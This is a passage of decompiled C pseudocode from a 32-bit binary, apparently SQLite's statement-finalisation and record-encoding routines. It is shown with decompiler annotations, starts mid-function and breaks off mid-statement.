      while ( !v32 );
      v26 = 0;
      if ( v32 )
        return v32;
      v27 = 0;
      do
      {
        if ( v26 >= a2[1] )
          break;
        v28 = *(_DWORD *)(v27 + a2[2] + 4);
        if ( v28 )
          v32 = sub_100631FC(v28);
        ++v26;
        v27 += 16;
      }
      while ( !v32 );
      if ( v32 )
        return v32;
    }
    sub_10071629((int)a2, 64);
    return v32;
  }
  return 19;
}
// 1005B7AD: conditional instruction was optimized away because edi.4==0
// 1005B86C: conditional instruction was optimized away because %var_28.4==0
// 1005B59F: variable 'v8' is possibly undefined
// 1005B5A4: variable 'v7' is possibly undefined
// 1005B5F6: variable 'v10' is possibly undefined
// 1005B6DA: variable 'v15' is possibly undefined
// 1005B73B: variable 'v18' is possibly undefined

//----- (1005B8E1) --------------------------------------------------------
void __usercall sub_1005B8E1(int a1@<esi>)
{
  int v1; // edi
  int i; // ebx
  int v3; // eax
  int v4; // ecx

  v1 = 0;
  for ( i = 0; i < *(_DWORD *)(a1 + 4); v1 += 16 )
  {
    v3 = *(_DWORD *)(a1 + 8);
    if ( *(_DWORD *)(v3 + v1 + 4) )
    {
      if ( sub_10066C14(*(_DWORD *)(v3 + v1 + 4)) )
        sub_10063268(v4, 4);
    }
    ++i;
  }
}
// 1005B906: variable 'v4' is possibly undefined

//----- (1005B91A) --------------------------------------------------------
int __usercall sub_1005B91A@<eax>(_DWORD *a1@<ebx>, int a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  int v7; // [esp+8h] [ebp-10h]
  int v8; // [esp+Ch] [ebp-Ch]
  int v9; // [esp+10h] [ebp-8h]
  int v10; // [esp+14h] [ebp-4h]

  v2 = (_DWORD *)*a1;
  v9 = 0;
  if ( *(_DWORD *)(*a1 + 456) )
  {
    v3 = a1[50];
    if ( v3 )
    {
      v10 = v3 - 1;
      v8 = 0;
      if ( (int)v2[1] > 0 )
      {
        v7 = 0;
        do
        {
          v4 = *(_DWORD *)(v7 + v2[2] + 4);
          if ( v4 )
          {
            if ( a2 != 2 || (v5 = sub_10063373(v4, 2, v10)) == 0 )
              v5 = sub_10063373(v4, 1, v10);
            if ( !v9 )
              v9 = v5;
          }
          ++v8;
          v7 += 16;
        }
        while ( v8 < v2[1] );
      }
      --v2[114];
      a1[50] = 0;
      if ( a2 == 2 )
      {
        v2[116] = a1[48];
        v2[117] = a1[49];
      }
    }
  }
  return v9;
}

//----- (1005B9E2) --------------------------------------------------------
int __usercall sub_1005B9E2@<eax>(int a1@<edi>)
{
  int *v1; // ebx
  int v2; // esi
  int result; // eax
  int v4; // [esp+0h] [ebp-4h]

  v4 = 0;
  if ( *(int *)(a1 + 120) > 0 )
  {
    v1 = (int *)(a1 + 124);
    do
    {
      v2 = *v1;
      ++*(_DWORD *)(v2 + 12);
      if ( !*(_BYTE *)(v2 + 10) )
        sub_10068C0F(v2);
      result = ++v4;
      ++v1;
    }
    while ( v4 < *(_DWORD *)(a1 + 120) );
  }
  return result;
}

//----- (1005BA17) --------------------------------------------------------
int __usercall sub_1005BA17@<eax>(int a1@<eax>, int a2)
{
  int v2; // ecx

  v2 = *(_DWORD *)a1;
  if ( a2 )
  {
    if ( *(__int64 *)(v2 + 464) <= 0 )
      return 0;
  }
  else if ( *(__int64 *)(a1 + 184) <= 0 )
  {
    return 0;
  }
  *(_DWORD *)(a1 + 88) = 19;
  *(_BYTE *)(a1 + 56) = 2;
  sub_10059206((unsigned int *)(a1 + 92), v2, aForeignKeyCons);
  return 1;
}

//----- (1005BA6D) --------------------------------------------------------
int __cdecl sub_1005BA6D(int a1)
{
  int v1; // ebx
  int v2; // esi
  int v3; // eax
  int v4; // edi
  int v5; // esi
  int v7; // eax
  char v8; // al
  int v9; // eax
  int v10; // ecx
  int v11; // eax
  int v12; // eax
  unsigned int v13; // [esp-4h] [ebp-18h]
  int v14; // [esp+10h] [ebp-4h]

  v1 = a1;
  v2 = *(_DWORD *)a1;
  if ( *(_BYTE *)(*(_DWORD *)a1 + 30) )
    *(_DWORD *)(a1 + 88) = 7;
  sub_1005B44B(a1);
  if ( *(_DWORD *)(a1 + 68) != -1108210269 )
    return 0;
  if ( *(int *)(a1 + 84) >= 0 )
  {
    v14 = 0;
    sub_1005B9E2(a1);
    v3 = (unsigned __int8)*(_DWORD *)(a1 + 88);
    if ( v3 == 7 || v3 == 10 || v3 == 9 || v3 == 13 )
    {
      v4 = 1;
      if ( !*(_BYTE *)(a1 + 102) || v3 != 9 )
      {
        if ( (v3 == 7 || v3 == 13) && *(_BYTE *)(a1 + 101) )
        {
          v14 = 2;
        }
        else
        {
          sub_1005B8E1(v2);
          sub_10053F1F(v2);
          sub_10053CF5(v2);
          *(_BYTE *)(v2 + 28) = 1;
        }
      }
    }
    else
    {
      v4 = 0;
    }
    if ( !*(_DWORD *)(a1 + 88) )
      sub_1005BA17(a1, 0);
    if ( *(int *)(v2 + 284) > 0 && !*(_DWORD *)(v2 + 280)
      || !*(_BYTE *)(v2 + 28)
      || *(_DWORD *)(v2 + 144) != (*(_BYTE *)(a1 + 102) == 0) )
    {
      if ( v14 )
      {
LABEL_44:
        v9 = sub_1005B91A((_DWORD *)a1, v14);
        goto LABEL_45;
      }
      if ( *(_DWORD *)(a1 + 88) )
      {
        v8 = *(_BYTE *)(a1 + 56);
        if ( v8 != 3 )
        {
          if ( v8 == 2 )
          {
            v14 = 2;
            v9 = sub_1005B91A((_DWORD *)a1, 2);
LABEL_45:
            if ( v9 )
            {
              v10 = *(_DWORD *)(a1 + 88);
              if ( !v10 || v10 == 19 )
              {
                v13 = *(_DWORD *)(a1 + 92);
                *(_DWORD *)(a1 + 88) = v9;
                sub_10058EC7(v2, v13);
                *(_DWORD *)(a1 + 92) = 0;
              }
            }
            goto LABEL_49;
          }
          sub_1005B8E1(v2);
          sub_10053F1F(v2);
          sub_10053CF5(v2);
          *(_BYTE *)(v2 + 28) = 1;
          goto LABEL_49;
        }
      }
      v14 = 1;
LABEL_43:
      if ( v14 )
        goto LABEL_44;
LABEL_49:
      if ( *(_BYTE *)(a1 + 97) )
      {
        if ( v14 == 2 )
        {
          *(_DWORD *)(v2 + 60) = 0;
        }
        else
        {
          v11 = *(_DWORD *)(a1 + 104);
          *(_DWORD *)(v2 + 64) += v11;
          *(_DWORD *)(v2 + 60) = v11;
        }
        *(_DWORD *)(a1 + 104) = 0;
      }
      if ( *(_DWORD *)(a1 + 88) && (*(_DWORD *)(v2 + 12) & 0x200) != 0 )
      {
        sub_1006A029(0, (_DWORD *)v2);
        *(_DWORD *)(v2 + 12) |= 0x200u;
        v1 = a1;
      }
      sub_10068DD3((int *)(v1 + 120));
      if ( *(int *)(v1 + 84) >= 0 )
      {
        --*(_DWORD *)(v2 + 140);
        if ( !*(_BYTE *)(v1 + 102) )
          --*(_DWORD *)(v2 + 144);
      }
      goto LABEL_60;
    }
    if ( !*(_DWORD *)(a1 + 88) || *(_BYTE *)(a1 + 56) == 3 && !v4 )
    {
      if ( sub_1005BA17(a1, 1) )
      {
        v5 = 1;
LABEL_28:
        sub_10068DD3((int *)(a1 + 120));
        return v5;
      }
      v7 = sub_1005B54D(a1, (int *)v2);
      if ( v7 == 5 )
      {
        v5 = 5;
        goto LABEL_28;
      }
      if ( !v7 )
      {
        *(_DWORD *)(v2 + 464) = 0;
        *(_DWORD *)(v2 + 468) = 0;
        *(_DWORD *)(v2 + 12) &= ~0x200u;
        goto LABEL_35;
      }
      *(_DWORD *)(a1 + 88) = v7;
    }
    sub_10053F1F(v2);
LABEL_35:
    *(_DWORD *)(v2 + 456) = 0;
    goto LABEL_43;
  }
LABEL_60:
  v12 = *(_DWORD *)v1;
  *(_DWORD *)(v1 + 68) = 1369188723;
  if ( *(_BYTE *)(v12 + 30) )
    *(_DWORD *)(v1 + 88) = 7;
  return 0;
}

//----- (1005BCA1) --------------------------------------------------------
int __usercall sub_1005BCA1@<eax>(int a1@<esi>)
{
  _DWORD *v1; // edi
  int v2; // edx
  int v3; // eax
  int v4; // eax
  int v5; // edx
  int v7; // [esp+0h] [ebp-10h]

  v1 = *(_DWORD **)a1;
  sub_1005BA6D(v7);
  if ( *(int *)(a1 + 84) < 0 )
  {
    v4 = *(_DWORD *)(a1 + 88);
    if ( v4 && *(_BYTE *)(a1 + 98) )
    {
      sub_100592B1(v1, v4, 0);
      v5 = v1[50];
      if ( v5 )
        sub_1005A3FE((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, v5, -1, *(_BYTE **)(a1 + 92), 1);
      goto LABEL_13;
    }
  }
  else
  {
    if ( *(_DWORD *)(a1 + 92) )
    {
      sub_10069106();
      v2 = v1[50];
      if ( v2 )
        sub_1005A3FE((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, v2, -1, *(_BYTE **)(a1 + 92), 1);
      sub_10069112();
      v1[5] = *(_DWORD *)(a1 + 88);
LABEL_13:
      sub_10058EC7((int)v1, *(_DWORD *)(a1 + 92));
      *(_DWORD *)(a1 + 92) = 0;
      goto LABEL_14;
    }
    v3 = *(_DWORD *)(a1 + 88);
    if ( v3 )
      sub_100592B1(v1, v3, 0);
    else
      sub_100592B1(v1, 0, 0);
  }
LABEL_14:
  sub_10058EC7(*(_DWORD *)a1, *(_DWORD *)(a1 + 92));
  *(_DWORD *)(a1 + 92) = 0;
  *(_DWORD *)(a1 + 44) = 0;
  *(_DWORD *)(a1 + 68) = 649915045;
  return *(_DWORD *)(a1 + 88) & v1[6];
}
// 1005BCA7: variable 'v7' is possibly undefined

//----- (1005BD60) --------------------------------------------------------
int __usercall sub_1005BD60@<eax>(unsigned int a1@<eax>)
{
  int v2; // eax
  int v3; // edi

  v2 = *(_DWORD *)(a1 + 68);
  v3 = 0;
  if ( v2 == -1108210269 || v2 == 1369188723 )
    v3 = sub_1005BCA1(a1);
  sub_1005BDCB(a1);
  return v3;
}

//----- (1005BD8A) --------------------------------------------------------
void __usercall sub_1005BD8A(int a1@<edi>, int a2)
{
  int v2; // ebx
  _DWORD *v3; // esi
  void (__cdecl *v4)(_DWORD); // eax

  v2 = 0;
  if ( *(int *)(a1 + 4) > 0 )
  {
    v3 = (_DWORD *)(a1 + 8);
    do
    {
      if ( (v2 > 31 || ((1 << v2) & a2) == 0) && *v3 )
      {
        v4 = (void (__cdecl *)(_DWORD))v3[1];
        if ( v4 )
          v4(*v3);
        *v3 = 0;
      }
      ++v2;
      v3 += 2;
    }
    while ( v2 < *(_DWORD *)(a1 + 4) );
  }
}

//----- (1005BDCB) --------------------------------------------------------
void __usercall sub_1005BDCB(unsigned int a1@<esi>)
{
  int v1; // eax
  int v2; // edi
  int v3; // eax
  unsigned int v4; // [esp-1Ch] [ebp-28h]

  if ( a1 )
  {
    v1 = *(_DWORD *)(a1 + 4);
    v2 = *(_DWORD *)a1;
    if ( v1 )
      *(_DWORD *)(v1 + 8) = *(_DWORD *)(a1 + 8);
    else
      *(_DWORD *)(v2 + 136) = *(_DWORD *)(a1 + 8);
    v3 = *(_DWORD *)(a1 + 8);
    if ( v3 )
      *(_DWORD *)(v3 + 4) = *(_DWORD *)(a1 + 4);
    sub_1005B11E(*(__int16 *)(a1 + 58), *(_DWORD *)(a1 + 60));
    sub_1005B11E(2 * *(unsigned __int16 *)(a1 + 48), *(_DWORD *)(a1 + 40));
    sub_1005AEE0(*(_DWORD *)(a1 + 12), *(_DWORD *)(a1 + 20), v2);
    sub_10058EC7(v2, *(_DWORD *)(a1 + 32));
    sub_10058EC7(v2, *(_DWORD *)(a1 + 40));
    sub_10058EC7(v2, *(_DWORD *)(a1 + 176));
    v4 = *(_DWORD *)(a1 + 180);
    *(_DWORD *)(a1 + 68) = -1241070648;
    sub_10058EC7(v2, v4);
    sub_10058EC7(v2, a1);
  }
}

//----- (1005BE63) --------------------------------------------------------
int __usercall sub_1005BE63@<eax>(int a1@<edi>)
{
  int result; // eax
  bool v2; // zf
  bool v3; // sf
  int v4; // esi
  BOOL v5; // ecx
  int v6; // [esp+Ch] [ebp-4h] BYREF

  if ( !*(_BYTE *)(a1 + 21) )
  {
    v4 = *(_DWORD *)a1;
    if ( *(_DWORD *)a1 )
    {
      if ( *(_BYTE *)(v4 + 67) < 2u )
        result = 0;
      else
        result = sub_10061630(v4);
      if ( result )
      {
        v5 = 1;
      }
      else
      {
        v5 = *(_BYTE *)(v4 + 67) != 1 || *(_DWORD *)(v4 + 80);
        result = 0;
      }
      if ( result )
        return result;
      if ( v5 )
      {
        *(_BYTE *)(a1 + 20) = 1;
        goto LABEL_20;
      }
    }
    return 0;
  }
  result = sub_10063A72(*(_DWORD *)a1, 0, *(_QWORD *)(a1 + 24), 0, &v6);
  if ( !result )
  {
    v2 = v6 == 0;
    *(_DWORD *)(a1 + 8) = *(_DWORD *)(a1 + 24);
    *(_DWORD *)(a1 + 12) = *(_DWORD *)(a1 + 28);
    v3 = v6 < 0;
    *(_BYTE *)(a1 + 17) = v2;
    if ( !v3 || (result = sub_10063D40(*(_DWORD *)a1, &v6)) == 0 )
    {
      *(_BYTE *)(a1 + 21) = 0;
LABEL_20:
      *(_DWORD *)(a1 + 68) = 0;
      return 0;
    }
  }
  return result;
}

//----- (1005BF02) --------------------------------------------------------
int __usercall sub_1005BF02@<eax>(int a1@<edx>, int a2)
{
  unsigned int v2; // ecx
  int result; // eax
  unsigned int v4; // ecx
  int v5; // edx
  bool v6; // sf
  bool v7; // cc

  v2 = *(unsigned __int16 *)(a1 + 28);
  result = 1;
  if ( (v2 & 1) != 0 )
    return 0;
  if ( (v2 & 4) != 0 )
  {
    v4 = *(_DWORD *)a1;
    v5 = *(_DWORD *)(a1 + 4);
    if ( a2 >= 4 && (v4 & 1) == v4 )
    {
      v6 = v5 < 0;
      v7 = v5 <= 0;
      if ( !v5 )
        return v4 + 8;
    }
    else
    {
      v6 = v5 < 0;
      v7 = v5 <= 0;
    }
    if ( v7 && v6 )
    {
      v4 = -v4;
      v5 = (unsigned __int64)-__SPAIR64__(v5, v4) >> 32;
    }
    if ( v5 || v4 > 0x7F )
    {
      if ( !v5 )
      {
        if ( v4 <= 0x7FFF )
          return 2;
        if ( v4 <= 0x7FFFFF )
          return 3;
        if ( v4 <= 0x7FFFFFFF )
          return 4;
      }
      if ( (unsigned int)v5 > 0x7FFF )
        return 6;
      else
        return 5;
    }
  }
  else
  {
    if ( (v2 & 8) != 0 )
      return 7;
    return ((v2 >> 1) & 1) + 2 * *(_DWORD *)(a1 + 24) + 12;
  }
  return result;
}
// 1005BF54: conditional instruction was optimized away because edi.4==0
// 1005BF64: conditional instruction was optimized away because edi.4==0
// 1005BF71: conditional instruction was optimized away because edx.4==0
// 1005BF73: conditional instruction was optimized away because edi.4==0
// 1005BF83: conditional instruction was optimized away because edx.4==0
// 1005BF85: conditional instruction was optimized away because edi.4==0

//----- (1005BFBE) --------------------------------------------------------
unsigned int __usercall sub_1005BFBE@<eax>(unsigned int a1@<eax>)
{
  if ( a1 < 0xC )
    return (unsigned __int8)byte_100FF164[a1];
  else
    return (a1 - 12) >> 1;
}

//----- (1005BFD1) --------------------------------------------------------
size_t __usercall sub_1005BFD1@<eax>(int a1@<eax>, void *a2@<ebx>, int a3)
{
  unsigned int v4; // edi
  unsigned int v5; // esi
  unsigned int v6; // eax
  unsigned int v7; // ecx
  unsigned int v8; // edx
  size_t v10; // edi
  int v11[2]; // [esp+Ch] [ebp-8h] BYREF

  v4 = sub_1005BF02(a1, a3);
  if ( v4 - 1 > 6 )
  {
    if ( v4 < 0xC )
    {
      return 0;
    }
    else
    {
      v10 = *(_DWORD *)(a1 + 24);
      memcpy(a2, *(const void **)(a1 + 20), v10);
      return v10;
    }
  }
  else
  {
    if ( v4 == 7 )
    {
      memcpy(v11, (const void *)(a1 + 8), sizeof(v11));
      v5 = v11[1];
    }
    else
    {
      v5 = *(_DWORD *)(a1 + 4);
    }
    v6 = sub_1005BFBE(v4);
    v8 = v6;
    while ( v6 )
    {
      *((_BYTE *)a2 + --v6) = v7;
      v7 = __PAIR64__(v5, v7) >> 8;
      v5 >>= 8;
    }
    return v8;
  }
}
// 1005C020: variable 'v7' is possibly undefined

//----- (1005C051) --------------------------------------------------------
unsigned int __usercall sub_1005C051@<eax>(int a1@<eax>, char *a2@<ecx>, int a3@<esi>)
{
  unsigned int result; // eax
  int v5; // eax
  int v6; // ecx
  int v7; // eax
  int v8; // edx
  int v9; // edx
  unsigned __int16 v10; // ax
  unsigned __int16 v11; // ax
  int v12; // edi
  int v13; // eax
  unsigned __int16 v14; // ax
  int v15; // edi
  int v16; // ebx
  int v17; // [esp+4h] [ebp-1Ch]
  int v18; // [esp+14h] [ebp-Ch]
  int Src[2]; // [esp+18h] [ebp-8h] BYREF

  switch ( a1 )
  {
    case 0:
    case 10:
    case 11:
      *(_WORD *)(a3 + 28) = 1;
      return 0;
    case 1:
      *(_QWORD *)a3 = *a2;
      result = 1;
      goto LABEL_4;
    case 2:
      v5 = *a2;
      v6 = (unsigned __int8)a2[1];
      v17 = 2;
      goto LABEL_6;
    case 3:
      v7 = *a2;
      v8 = (unsigned __int8)a2[1];
      v6 = (unsigned __int8)a2[2];
      v5 = v8 | (v7 << 8);
      v17 = 3;
      goto LABEL_6;
    case 4:
      v9 = (unsigned __int8)a2[2];
      HIBYTE(v10) = *a2;
      v17 = 4;
      LOBYTE(v10) = a2[1];
      v6 = (unsigned __int8)a2[3];
      v5 = v9 | (v10 << 8);
LABEL_6:
      *(_QWORD *)a3 = v6 | (v5 << 8);
      goto LABEL_7;
    case 5:
      HIBYTE(v11) = a2[2];
      v17 = 6;
      LOBYTE(v11) = a2[3];
      v12 = (unsigned __int8)a2[5] | (((unsigned __int8)a2[4] | (v11 << 8)) << 8);
      v13 = (unsigned __int8)a2[1] | (*a2 << 8);
      *(_DWORD *)a3 = v12;
      *(_DWORD *)(a3 + 4) = v13;
LABEL_7:
      result = v17;
      goto LABEL_4;
    case 6:
    case 7:
      HIBYTE(v14) = *a2;
      LOBYTE(v14) = a2[1];
      v18 = (unsigned __int8)a2[3] | (((unsigned __int8)a2[2] | (v14 << 8)) << 8);
      HIBYTE(v14) = a2[4];
      LOBYTE(v14) = a2[5];
      v15 = (unsigned __int8)a2[7] | (((unsigned __int8)a2[6] | (v14 << 8)) << 8);
      Src[0] = v15;
      Src[1] = v18;
      if ( a1 == 6 )
      {
        *(_DWORD *)a3 = v15;
        *(_DWORD *)(a3 + 4) = v18;
        *(_WORD *)(a3 + 28) = 4;
      }
      else
      {
        memcpy((void *)(a3 + 8), Src, 8u);
        *(_WORD *)(a3 + 28) = sub_1005926E() != 0 ? 1 : 8;
      }
      return 8;
    case 8:
    case 9:
      v16 = a1 - 8;
      result = 0;
      *(_DWORD *)a3 = v16;
      *(_DWORD *)(a3 + 4) = 0;
LABEL_4:
      *(_WORD *)(a3 + 28) = 4;
      break;
    default:
      *(_DWORD *)(a3 + 32) = 0;
      result = (unsigned int)(a1 - 12) >> 1;
      *(_DWORD *)(a3 + 20) = a2;
      *(_DWORD *)(a3 + 24) = result;
      *(_WORD *)(a3 + 28) = (a1 & 1) != 0 ? 4098 : 4112;
      break;
  }
  return result;
}

//----- (1005C1FD) --------------------------------------------------------
_DWORD *__usercall sub_1005C1FD@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4, unsigned __int8 *a5)
{
  int v6; // ecx
  int v7; // eax
  _DWORD *result; // eax
  int v9; // edi
  int v10; // ecx
  int v11; // esi
  unsigned __int8 v12; // al
  unsigned __int8 v13; // al
  unsigned __int8 v14; // al
  int v15; // eax
  unsigned int v16; // eax
  int v17; // [esp+8h] [ebp-18h] BYREF
  unsigned int v18; // [esp+Ch] [ebp-14h] BYREF
  int v19; // [esp+10h] [ebp-10h]
  unsigned int v20; // [esp+14h] [ebp-Ch]
  int i; // [esp+18h] [ebp-8h]
  _DWORD *v22; // [esp+1Ch] [ebp-4h]

  v6 = -a1 & 7;
  v7 = 40 * *(unsigned __int16 *)(a3 + 6) + 64;
  if ( v7 <= a2 - v6 )
  {
    v10 = a1 + v6;
    v22 = (_DWORD *)v10;
    *(_WORD *)(v10 + 6) = 2;
    v9 = v10;
  }
  else
  {
    result = sub_10059073(*(_DWORD *)a3, v7);
    v9 = (int)result;
    v22 = result;
    if ( !result )
      return result;
    *((_WORD *)result + 3) = 3;
  }
  *(_DWORD *)v9 = a3;
  v11 = v9 + 24;
  *(_WORD *)(v9 + 4) = *(_WORD *)(a3 + 6) + 1;
  *(_DWORD *)(v9 + 16) = v9 + 24;
  if ( *a5 >= 0x80u )
  {
    v12 = sub_10059BD0(a5, (int *)&v18);
    v9 = (int)v22;
  }
  else
  {
    v18 = *a5;
    v12 = 1;
  }
  v19 = 0;
  v20 = v12;
  for ( i = v18; v20 < v18; ++v19 )
  {
    if ( (unsigned __int16)v19 >= *(_WORD *)(v9 + 4) || i > a4 )
      break;
    v13 = a5[v20];
    if ( v13 >= 0x80u )
    {
      v14 = sub_10059BD0(&a5[v20], &v17);
      v9 = (int)v22;
    }
    else
    {
      v17 = v13;
      v14 = 1;
    }
    v20 += v14;
    *(_BYTE *)(v11 + 31) = *(_BYTE *)(a3 + 4);
    v15 = *(_DWORD *)a3;
    *(_WORD *)(v11 + 28) = 0;
    *(_DWORD *)(v11 + 36) = 0;
    *(_DWORD *)(v11 + 16) = v15;
    v16 = sub_1005C051(v17, (char *)&a5[i], v11);
    i += v16;
    v11 += 40;
  }
  *(_WORD *)(v9 + 4) = v19;
  return (_DWORD *)v9;
}

//----- (1005C313) --------------------------------------------------------
void __usercall sub_1005C313(unsigned int a1@<esi>)
{
  int v1; // ebx
  int *v2; // edi

  v1 = 0;
  v2 = *(int **)(a1 + 16);
  if ( *(_WORD *)(a1 + 4) )
  {
    do
    {
      if ( v2[9] )
        sub_10059FC7(v2);
      ++v1;
      v2 += 10;
    }
    while ( v1 < *(unsigned __int16 *)(a1 + 4) );
  }
  if ( (*(_BYTE *)(a1 + 6) & 1) != 0 )
    sub_10058EC7(**(_DWORD **)a1, a1);
}

//----- (1005C34E) --------------------------------------------------------
int __cdecl sub_1005C34E(int a1, unsigned __int8 *a2, int a3)
{
  unsigned __int8 *v3; // ebx
  int v4; // esi
  unsigned __int8 v5; // al
  bool v6; // cf
  unsigned __int8 v7; // al
  bool v8; // zf
  unsigned __int8 v9; // al
  unsigned __int8 v10; // al
  int v11; // edi
  int v12; // ebx
  int v13; // esi
  __int16 v14; // ax
  int v15; // eax
  __int16 v16; // cx
  int v18[7]; // [esp+10h] [ebp-54h] BYREF
  char v19; // [esp+2Fh] [ebp-35h]
  int v20; // [esp+38h] [ebp-2Ch]
  int v21; // [esp+3Ch] [ebp-28h]
  int v22; // [esp+40h] [ebp-24h]
  int v23; // [esp+44h] [ebp-20h]
  int *v24; // [esp+48h] [ebp-1Ch]
  unsigned int v25; // [esp+4Ch] [ebp-18h] BYREF
  int v26; // [esp+50h] [ebp-14h]
  unsigned int v27; // [esp+54h] [ebp-10h]
  int v28; // [esp+58h] [ebp-Ch]
  unsigned int v29; // [esp+5Ch] [ebp-8h] BYREF

  v28 = 0;
  v26 = 0;
  v3 = a2;
  v4 = *(_DWORD *)a3;
  v19 = *(_BYTE *)(*(_DWORD *)a3 + 4);
  v18[4] = *(_DWORD *)v4;
  v5 = *a2;
  v6 = *a2 < 0x80u;
  v20 = v4;
  if ( v6 )
  {
    v29 = v5;
    v7 = 1;
  }
  else
  {
    v7 = sub_10059BD0(a2, (int *)&v29);
  }
  v22 = v29;
  v8 = (*(_BYTE *)(a3 + 6) & 4) == 0;
  v27 = v7;
  if ( !v8 )
    --v29;
  v21 = *(unsigned __int16 *)(v4 + 6);
  if ( v7 < v29 )
  {
    v23 = 0;
    v24 = (int *)(v4 + 12);
    while ( v28 < *(unsigned __int16 *)(a3 + 4) )
    {
      v9 = v3[v27];
      if ( v9 >= 0x80u )
      {
        v10 = sub_10059BD0(&v3[v27], (int *)&v25);
      }
      else
      {
        v25 = v9;
        v10 = 1;
      }
      v11 = v22;
      v27 += v10;
      if ( v22 >= a1 )
      {
        if ( sub_1005BFBE(v25) )
          break;
      }
      v22 = sub_1005C051(v25, (char *)&v3[v11], (int)v18) + v11;
      if ( v28 >= v21 )
        v12 = 0;
      else
        v12 = *v24;
      v13 = sub_1005A556((int)v18, v12, v23 + *(_DWORD *)(a3 + 16));
      v26 = v13;
      if ( v13 )
      {
        v15 = *(_DWORD *)(v20 + 8);
        if ( v15 && v28 < v21 && *(_BYTE *)(v15 + v28) )
          v13 = -v13;
        v16 = *(_WORD *)(a3 + 6);
        if ( (v16 & 0x20) != 0 && v28 == *(unsigned __int16 *)(a3 + 4) - 1 )
        {
          *(_WORD *)(a3 + 6) = v16 & 0xFFDF;
          *(_DWORD *)(a3 + 8) = v18[0];
          *(_DWORD *)(a3 + 12) = v18[1];
        }
        return v13;
      }
      ++v28;
      ++v24;
      v23 += 40;
      if ( v27 >= v29 )
        break;
      v3 = a2;
    }
  }
  v14 = *(_WORD *)(a3 + 6);
  if ( (v14 & 8) != 0 )
    return -1;
  if ( (v14 & 0x10) == 0 && v27 < v29 )
    return 1;
  return v26;
}

//----- (1005C4E1) --------------------------------------------------------
int __cdecl sub_1005C4E1(int a1, _DWORD *a2)
{
  int result; // eax
  int v3; // ebx
  int v4; // esi
  unsigned __int8 *v5; // ecx
  unsigned int v6; // edx
  unsigned int v7; // eax
  int v8; // edx
  int v9; // esi
  int v10[10]; // [esp+10h] [ebp-58h] BYREF
  int v11[10]; // [esp+38h] [ebp-30h] BYREF
  size_t v12; // [esp+60h] [ebp-8h] BYREF
  unsigned int v13; // [esp+64h] [ebp-4h] BYREF

  v12 = 0;
  v13 = 0;
  sub_10063501(a1, &v12);
  memset(v11, 0, sizeof(v11));
  result = sub_1005A70D((int)v11, a1, v12, 0, 1);
  if ( !result )
  {
    v3 = v11[5];
    if ( *(_BYTE *)v11[5] >= 0x80u )
    {
      sub_10059BD0((unsigned __int8 *)v11[5], (int *)&v13);
      v4 = v13;
    }
    else
    {
      v4 = *(unsigned __int8 *)v11[5];
    }
    if ( (unsigned int)v4 < 3
      || v4 > v11[6]
      || ((v5 = (unsigned __int8 *)(v4 + v3 - 1), *v5 >= 0x80u) ? (sub_10059BD0(v5, (int *)&v13), v6 = v13) : (v6 = *v5),
          v6 - 1 > 8 || v6 == 7 || (v7 = sub_1005BFBE(v6), v11[6] < v7 + v4)) )
    {
      v9 = 11;
    }
    else
    {
      sub_1005C051(v8, (char *)(v3 + v11[6] - v7), (int)v10);
      *a2 = v10[0];
      a2[1] = v10[1];
      v9 = 0;
    }
    sub_10059FC7(v11);
    return v9;
  }
  return result;
}
// 1005C58C: variable 'v8' is possibly undefined

//----- (1005C5B7) --------------------------------------------------------
int __usercall sub_1005C5B7@<eax>(int *a1@<esi>, int a2, int *a3)
{
  int v3; // eax
  int result; // eax
  int v5[10]; // [esp+8h] [ebp-30h] BYREF
  __int64 v6; // [esp+30h] [ebp-8h] BYREF

  v3 = *a1;
  v6 = 0i64;
  sub_10063501(v3, &v6);
  if ( (unsigned __int64)(v6 - 1) > 0x7FFFFFFE )
  {
    *a3 = 0;
    return 11;
  }
  else
  {
    memset(v5, 0, sizeof(v5));
    result = sub_1005A70D((int)v5, *a1, v6, 0, 1);
    if ( !result )
    {
      *a3 = sub_1005C34E(v5[6], (unsigned __int8 *)v5[5], a2);
      sub_10059FC7(v5);
      return 0;
    }
  }
  return result;
}

//----- (1005C640) --------------------------------------------------------
int __usercall sub_1005C640@<eax>(int a1@<eax>)
{
  int result; // eax

  for ( result = *(_DWORD *)(a1 + 136); result; result = *(_DWORD *)(result + 8) )
    *(_BYTE *)(result + 98) = 1;
  return result;
}

//----- (1005C654) --------------------------------------------------------
_DWORD *__usercall sub_1005C654@<eax>(int a1@<eax>, int *a2@<ecx>)
{
  int v2; // ebx
  _DWORD *v3; // esi

  if ( !a2 )
    return 0;
  v2 = a2[15] + 40 * a1 - 40;
  if ( (*(_BYTE *)(v2 + 28) & 1) != 0 )
    return 0;
  v3 = sub_1005A85A(*a2);
  if ( v3 )
  {
    sub_1005A394((_WORD *)v2, (int)v3);
    sub_1005C806((int)v3, 98, 1u);
    sub_1005C69B((int)v3);
  }
  return v3;
}

//----- (1005C69B) --------------------------------------------------------
int __thiscall sub_1005C69B(int this)
{
  int result; // eax

  result = *(unsigned __int16 *)(this + 28);
  if ( (result & 1) != 0 )
  {
    *(_BYTE *)(this + 30) = 5;
  }
  else if ( (result & 4) != 0 )
  {
    *(_BYTE *)(this + 30) = 1;
  }
  else if ( (result & 8) != 0 )
  {
    *(_BYTE *)(this + 30) = 2;
  }
  else
  {
    LOBYTE(result) = -((result & 2) != 0);
    result += 4;
    *(_BYTE *)(this + 30) = result;
  }
  return result;
}

//----- (1005C6C7) --------------------------------------------------------
_DWORD *__usercall sub_1005C6C7@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3, int a4, int a5)
{
  int v6; // esi
  int *v7; // eax
  _DWORD *v8; // edi
  void *v10; // [esp-Ch] [ebp-28h]
  int v11; // [esp+10h] [ebp-Ch]
  int v12; // [esp+18h] [ebp-4h]

  v6 = a1[19] + 40 * (a1[18] - a2);
  v11 = 8 * a3 + 88;
  v12 = 4 * a2;
  v7 = (int *)(a1[13] + 4 * a2);
  if ( *v7 )
  {
    sub_1005B3D0(*v7, (int)a1);
    *(_DWORD *)(v12 + a1[13]) = 0;
  }
  if ( sub_10059D49((a5 != 0 ? 0xD0 : 0) + v11, v6, 0) )
    return 0;
  v8 = *(_DWORD **)(v6 + 20);
  *(_DWORD *)(v12 + a1[13]) = v8;
  memset(v8, 0, 0x58u);
  v8[1] = a4;
  v8[11] = a3;
  if ( a3 )
